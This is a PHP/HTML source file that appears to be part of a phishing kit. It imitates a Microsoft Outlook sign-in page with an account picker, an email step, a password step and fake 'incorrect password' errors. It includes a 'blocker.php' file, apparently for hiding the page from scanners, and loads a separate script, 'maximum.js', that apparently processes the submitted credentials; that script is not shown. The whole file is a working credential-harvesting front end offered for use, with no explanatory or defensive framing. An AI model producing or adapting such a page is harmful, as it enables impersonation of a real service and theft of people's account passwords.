<?php
error_reporting(0);
include ('blocker.php');
@session_start();
?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
   <title>Sign in to your account</title>
   <meta charset="utf-8">
   <link href="lib/img/favicon.ico" rel="shortcut icon">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha256-NuCn4IvuZXdBaFKJOAcsU2Q3ZpwbdFisd5dux4jkQ5w=" crossorigin="anonymous">
   <link href="lib/css/login.css" rel="stylesheet">
   
 
   	
   <body class="cb" style="display:block">
      <div>
         <div>
            <div class="app background">
               <div id="bg_image" style="background-image:url(lib/img/background.jpg)"></div>
            </div>
         </div>

            <div class="outer">
               <div class="app middle">
                 
                  <div class="app fade-in-lightbox inner">
                     <div>
                        <img id="logo_image" class="banner-logo" src="lib/img/logo2.svg">
                     </div>
                     <div>

					 
                        <div id="pick_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton="true" data-viewid="1">
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level="1">Sign in</div>
                                    </div>
                                 </div>
                                 <div class="row">
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
					                   <div class="add_em">
											 <p style="font-weight: bold;margin-left: 4%">Pick an account</p>
											 <a href="#" class="email-picker">
												 <div class="block-m2">
													<img role="presentation" src="lib/img/picker_account.png"> <span id="em_picker"></span><span style="float:right; margin-top:4%"><img src="lib/img/picker_more.png" alt=""></span>
												 </div>
											 </a>
											 <a href="#" class="email-picker2">
												 <div class="block-m2">
													<img role="presentation" src="lib/img/plus.svg"><span style="word-wrap:break-word;"> Use another account</span>
												 </div>
											 </a>
											 <br>
										</div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">

                                 </div>
                              </div>
                           </div>
                        </div>
						
                        <div id="add_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton="true" data-viewid="1">
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level="1">Sign in</div>
                                       <div class="text-13 subtitle" aria-level="2">to continue to Outlook</div>
                                    </div>
                                 </div>
                                 <div class="row">
									<div aria-live="assertive" role="alert" style="display: none;" class="error-alert">
										<div class="alert alert-error error-alert-msg"></div>
										<br>
									</div>
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
											<input type="text" name="email" id="email" class="form-control ltr_override" value="" placeholder="someone@example.com ">
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">
                                    <div class="row">
                                       <div class="col-md-24">
                                          <div class="text-13 action-links">
                                             <div class="form-group">
                                                <a href="#" >Can’t access your account?</a>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row">
                                       <div class="col-xs-24 no-padding-left-right button-container">
                                       <div class="inline-block">
                                          <button class="btn btn-block btn-primary btn-email" id="next" >Next</button>
                                       </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
					
					
						
					
						<div id="add_pass" style="display: none;">
							<div class="animate slide-in-next">
								<div>
									<div class="identityBanner">
										<a class="backButton" href="#" type="button">
											<img src="lib/img/arrow.svg">
										</a>
										<div class="identity"></div>
									</div>
								</div>
							</div>
							<div class="animate slide-in-next has-identity-banner pagination-view">
								<div class="row text-title">Enter password</div>
								<div class="row">
								
									<div class="form-group col-md-24">
										<div aria-live="assertive" role="alert" style="display: none;" class="empty-alert-pass">
											<div class="alert alert-error">Please enter your password</div>
										</div>
										<div aria-live="assertive" role="alert" style="display: none;" class="error-alert-pass">
											<div class="alert alert-error">Your email or password is incorrect. If you don't remember your password, <a href='#'>reset it now.</a></div>
										</div>
										<div class="placeholderContainer">
											<input name="password" type="password" id="password" autocomplete="off" class="form-control" placeholder="Password" tabindex="0">
										</div>
									</div>
								</div>
								<div class="position-buttons">
									<div>
										<div class="row">
											<div class="col-md-24">
													<div class="action-links text-13">
													<div class="form-group"><a href="#">Forgot my password</a></div>
													<div class="form-group"></div>
												</div>
											</div>
										</div>
									</div>
									<div class=row >
										<div>
											<div class="button-container col-xs-24 no-padding-left-right">
												<div class="inline-block">
													<button class="btn btn-block btn-primary btn-signin" id="signin" >Sign in</button>
												</div>
											</div>
										</div>
									 </div>
								</div>
							</div>
                        </div>
	
                     </div>
                  </div>
                  <div>
                  </div>
                  <div class="footer id=footer">
                     <div>
                        <div class="footerNode text-secondary"> 
                           <a href="#">Terms of use</a> 
                           <a href="#">Privacy & cookies</a>
                           <a href="#"><img src="lib/img/white_ellipsis.svg"></a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>

      </div>
	  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
	  <script src="lib/js/maximum.js"></script>
	  <script>
		var input = document.getElementById("email");
		var inputz = document.getElementById("password");
		input.addEventListener("keyup", function(event) {
		  if (event.keyCode === 13) {
		   event.preventDefault();
		   document.getElementById("next").click();
		  }
		});
		inputz.addEventListener("keyup", function(event) {
		  if (event.keyCode === 13) {
		   event.preventDefault();
		   document.getElementById("signin").click();
		  }
		});
		
	</script>
	 
	
   </body>
   </html>